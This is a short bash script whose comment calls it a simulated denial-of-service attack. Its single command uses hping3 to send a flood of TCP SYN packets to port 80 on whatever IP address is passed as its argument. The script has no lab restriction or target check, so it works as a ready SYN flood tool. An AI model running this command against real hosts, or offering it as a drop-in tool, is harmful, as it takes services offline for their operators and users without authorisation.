#!/bin/bash

# Simulate a DoS attack on the target IP using hping3
sudo hping3 -S --flood -p 80 "$1"
